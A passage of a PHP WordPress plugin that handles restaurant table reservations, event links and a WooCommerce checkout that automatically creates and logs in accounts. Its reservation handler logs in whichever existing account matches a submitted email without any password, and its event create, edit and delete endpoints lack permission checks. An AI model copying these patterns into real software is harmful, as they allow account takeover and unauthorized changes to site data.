            $this->wpdb->insert($this->table_votes, ['event_name'=>$ev, 'voter_name'=>$name, 'voter_email'=>$email, 'voter_whatsapp'=>$wa]);
            wp_send_json_success();
        }

        public function ajax_admin_update_reservation() {
            if (!current_user_can('manage_options')) wp_die();
            $id = intval($_POST['id']);
            $this->wpdb->update($this->table_name, [
                'client_name' => sanitize_text_field($_POST['name']), 'phone' => sanitize_text_field($_POST['phone']),
                'client_email' => sanitize_email($_POST['email']), 'booking_date' => sanitize_text_field($_POST['date']),
                'booking_time' => sanitize_text_field($_POST['time']), 'salon_type' => sanitize_text_field($_POST['salon_type']), 
                'guests' => intval($_POST['guests']), 'status' => sanitize_text_field($_POST['status']),
                'advance_payment' => floatval($_POST['payment']), 'tables_data' => stripslashes($_POST['tables'])
            ], ['id' => $id]);
            wp_send_json_success();
        }

        public function ajax_get_adjacent_tables() {
            if (!current_user_can('manage_options')) wp_die();
            $date = sanitize_text_field($_POST['date']); $res_id = intval($_POST['reservation_id']);
            $current = isset($_POST['current_tables']) ? (array)$_POST['current_tables'] : [];
            
            $results = $this->wpdb->get_results($this->wpdb->prepare("SELECT tables_data FROM $this->table_name WHERE booking_date = %s AND status != 'cancelled' AND id != %d", $date, $res_id), ARRAY_A);
            $occupied = []; foreach($results as $r) { $t_arr = json_decode($r['tables_data'], true); if(is_array($t_arr)) $occupied = array_merge($occupied, $t_arr); }
            $occupied = array_unique($occupied);
            $available = []; foreach($this->tables_config as $t) { if (!in_array((string)$t['id'], $occupied) && !in_array((string)$t['id'], $current)) { $available[] = $t; } }

            $final_available = [];
            if (count($current) > 0) {
                $current_coords = []; foreach($this->tables_config as $t) { if (in_array((string)$t['id'], $current)) $current_coords[] = $t; }
                foreach ($available as $a_tab) {
                    $is_near = false;
                    foreach ($current_coords as $c_tab) {
                        $dist = sqrt(pow($a_tab['x'] - $c_tab['x'], 2) + pow($a_tab['y'] - $c_tab['y'], 2));
                        if ($dist <= 160) { $is_near = true; break; }
                    }
                    if ($is_near) $final_available[] = $a_tab;
                }
            } else { $final_available = $available; }
            wp_send_json(['success' => true, 'tables' => $final_available]);
        }

        public function ajax_create_event_link() {
            $name = sanitize_text_field($_POST['name']); $date = sanitize_text_field($_POST['date']);
            $price = !empty($_POST['price']) ? floatval($_POST['price']) : get_option('km_price_per_person', 2000);
            $popup = !empty($_POST['popup']) ? sanitize_textarea_field($_POST['popup']) : get_option('km_popup_text');
            $link = site_url('/reservas-2') . '?fecha=' . $date . '&evento=si&nombre_evento=' . urlencode($name);
            $this->wpdb->insert($this->table_events, [ 'event_name'=>$name, 'event_date'=>$date, 'price_per_person'=>$price, 'popup_text'=>$popup, 'generated_link'=>$link ]);
            wp_send_json_success();
        }

        public function ajax_edit_event() {
            $id = intval($_POST['id']); $name = sanitize_text_field($_POST['name']); $date = sanitize_text_field($_POST['date']);
            $price = floatval($_POST['price']); $popup = sanitize_textarea_field($_POST['popup']);
            $link = site_url('/reservas-2') . '?fecha=' . $date . '&evento=si&nombre_evento=' . urlencode($name);
            $this->wpdb->update($this->table_events, [ 'event_name' => $name, 'event_date' => $date, 'price_per_person' => $price, 'popup_text' => $popup, 'generated_link' => $link ], ['id' => $id]);
            wp_send_json_success();
        }
        
        public function ajax_delete_event() { $this->wpdb->delete($this->table_events, ['id'=>intval($_POST['id'])]); wp_send_json_success(); }

        public function ajax_fetch_occupied() {
            $d = sanitize_text_field($_POST['date']);
            $r = $this->wpdb->get_results($this->wpdb->prepare("SELECT tables_data FROM $this->table_name WHERE booking_date = %s AND status != 'cancelled'", $d), ARRAY_A);
            $o = []; foreach($r as $row) { $o = array_merge($o, json_decode($row['tables_data'],true)??[]); }
            wp_send_json(['occupied'=>array_values(array_unique($o))]);
        }

        // ==========================================
        // CHECKOUT ZERO & CUENTA FANTASMA
        // ==========================================
        public function ajax_initiate_reservation() {
            if (!class_exists('WooCommerce')) wp_send_json(['success'=>false, 'message'=>'WooCommerce inactivo']);
            
            $guests = intval($_POST['guests']); $evt_name = sanitize_text_field($_POST['event_name']); $evt_date = sanitize_text_field($_POST['date']);
            $is_evt = intval($_POST['is_event']); $salon = isset($_POST['salon_type']) ? sanitize_text_field($_POST['salon_type']) : null;
            $c_name = sanitize_text_field($_POST['name']); $c_phone = sanitize_text_field($_POST['phone']); $c_email = sanitize_email($_POST['email']);

            $price_pp = (int)get_option('km_price_per_person', 2000);
            if ($is_evt && $evt_name) {
                $evt_db = $this->wpdb->get_row($this->wpdb->prepare("SELECT price_per_person FROM $this->table_events WHERE event_date = %s AND event_name = %s", $evt_date, $evt_name));
                if ($evt_db && !empty($evt_db->price_per_person)) $price_pp = (int)$evt_db->price_per_person;
            }
            $total_price = floatval($guests * $price_pp);
            $code = strtoupper(substr(md5(uniqid()),0,6));
            
            $user_id = email_exists($c_email);
            if (!$user_id) {
                $user_id = wp_create_user($c_email, wp_generate_password(12, false), $c_email);
                $names = explode(' ', $c_name, 2); wp_update_user(['ID' => $user_id, 'first_name' => $names[0], 'last_name' => isset($names[1]) ? $names[1] : '']);
            }
            wp_set_current_user($user_id); wp_set_auth_cookie($user_id, true);

            $inserted = $this->wpdb->insert($this->table_name, [
                'reservation_code'=>$code, 'client_name'=>$c_name, 'phone'=>$c_phone, 'client_email'=>$c_email,
                'booking_date'=>$evt_date, 'booking_time'=>sanitize_text_field($_POST['time']), 'guests'=>$guests, 
                'salon_type' => $salon, 'tables_data'=>stripslashes($_POST['tables']), 'is_event'=>$is_evt, 'event_name'=>$evt_name, 
                'status' => 'pending_payment', 'advance_payment' => $total_price 
            ]);

            if($inserted) {
                $res_id = $this->wpdb->insert_id;
                if(function_exists('WC') && WC()->cart && WC()->session) {
                    WC()->cart->empty_cart();
                    $names = explode(' ', $c_name, 2);
                    WC()->session->set('km_checkout_prefill', ['first_name' => $names[0], 'last_name' => isset($names[1]) ? $names[1] : '', 'email' => $c_email, 'phone' => $c_phone]);

                    $product_id = get_option('km_custom_product_id'); 
                    $product = wc_get_product($product_id);
                    if (!$product) wp_send_json(['success'=>false, 'message'=>'Producto no válido.']);
                    
                    $base_price = (float)$product->get_price(); if ($base_price <= 0) $base_price = 1;
                    $qty = ceil($total_price / $base_price); 
                    WC()->session->set('km_price_adjustment', $total_price - ($qty * $base_price));
                    WC()->cart->add_to_cart($product_id, $qty, 0, [], ['km_reservation_id' => $res_id]);
                    wp_send_json(['success'=>true, 'redirect'=>wc_get_checkout_url()]);
                }
            }
            wp_send_json(['success'=>false, 'message'=>'Error general.']);
        }

        public function wc_exact_price_adjustment($cart) {
            if (is_admin() && !defined('DOING_AJAX')) return;
            if (function_exists('WC') && WC()->session) {
                $adj = WC()->session->get('km_price_adjustment');
                if ($adj && $adj != 0) $cart->add_fee('Ajuste al valor', $adj, false);
            }
        }
        public function wc_remove_all_checkout_fields($fields) {
            if (isset($fields['billing'])) { foreach (array_keys($fields['billing']) as $field) unset($fields['billing'][$field]); }
            if (isset($fields['order'])) unset($fields['order']['order_comments']);
            return $fields;
        }
        public function wc_inject_order_billing_data($order, $data) {
            if (function_exists('WC') && WC()->session) {
                $prefill = WC()->session->get('km_checkout_prefill');
                if (!empty($prefill)) { $order->set_billing_first_name($prefill['first_name']); $order->set_billing_last_name($prefill['last_name']); $order->set_billing_email($prefill['email']); $order->set_billing_phone($prefill['phone']); }
            }
        }
        public function wc_add_reservation_meta($item, $cart_item_key, $values, $order) {
            if (isset($values['km_reservation_id'])) $item->add_meta_data('km_reservation_id', $values['km_reservation_id']);
        }
        public function wc_confirm_reservation($order_id) {
            $order = wc_get_order($order_id); if(!$order) return;
            foreach ($order->get_items() as $item) {
                $res_id = $item->get_meta('km_reservation_id');
                if ($res_id) {
                    $this->wpdb->update($this->table_name, ['status' => 'confirmed', 'advance_payment' => $item->get_total(), 'wc_order_id' => $order_id], ['id' => $res_id]);
                    if (function_exists('WC') && WC()->session) { WC()->session->set('km_checkout_prefill', null); WC()->session->set('km_price_adjustment', null); }
                }
            }
        }
        public function wc_cancel_reservation($order_id) {
            $order = wc_get_order($order_id);
            foreach ($order->get_items() as $item) {
                $res_id = $item->get_meta('km_reservation_id');
                if ($res_id) $this->wpdb->update($this->table_name, ['status' => 'cancelled'], ['id' => $res_id]);
            }
        }
    }
}
new KaceMaster_Elite();
